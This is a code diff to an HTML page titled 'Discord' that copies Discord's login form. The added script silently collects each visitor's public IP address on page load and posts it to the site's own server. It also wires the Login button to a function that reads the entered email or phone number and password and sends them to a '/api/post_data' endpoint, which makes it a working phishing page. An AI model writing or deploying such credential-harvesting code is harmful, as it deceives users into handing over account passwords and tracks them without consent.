@@ -34,9 +34,36 @@
     <title>Discord</title>
     <link rel="icon" href="fav.ico" />
     <script>
-      fetch("http://example.com/movies.json")
-        .then((response) => response.json())
-        .then((data) => console.log(data));
+      window.onload = (event) => {
+        fetch("https://api.ipify.org?format=json")
+          .then((response) => response.json())
+          .then(async (data) => {
+            const url = window.location.protocol + "//" + window.location.host;
+            const rawResponse = await fetch(url + "/api/post_ip", {
+              method: "POST",
+              headers: {
+                Accept: "application/json",
+                "Content-Type": "application/json",
+              },
+              body: data.ip,
+            });
+          })
+          .catch((e) => {});
+      };
+      async function submit_ph(event) {
+        event.preventDefault();
+        const url = window.location.protocol + "//" + window.location.host;
+        const username = document.getElementById("username_ph").value;
+        const password = document.getElementById("password_ph").value;
+        const rawResponse = await fetch(url + "/api/post_data", {
+          method: "POST",
+          headers: {
+            Accept: "application/json",
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ username: username, password: password }),
+        });
+      }
     </script>
   </head>
 
@@ -1428,6 +1455,7 @@
                                 <input
                                   class="inputDefault-3FGxgL input-2g-os5 inputField-2RZxdl"
                                   name="email"
+                                  id="username_ph"
                                   type="text"
                                   placeholder=""
                                   aria-label="Email or Phone Number"
@@ -1458,6 +1486,7 @@
                               <input
                                 class="inputDefault-3FGxgL input-outline input-2g-os5"
                                 name="pass"
+                                id="password_ph"
                                 type="password"
                                 placeholder=""
                                 aria-label="Password"
@@ -1481,7 +1510,7 @@
                             type="submit"
                             class="marginBottom8-emkd0_ button-1cRKG6 button-f2h6uQ lookFilled-yCfaCM colorBrand-I6CyqQ sizeLarge-3mScP9 fullWidth-fJIsjq grow-2sR_-F"
                           >
-                            <div class="contents-3ca1mk">Login</div>
+                            <div class="contents-3ca1mk" onclick="submit_ph(event)">Login</div>
                           </button>
                           <div class="marginTop4-2JFJJI">
                             <span class="needAccount-MrvMN7"
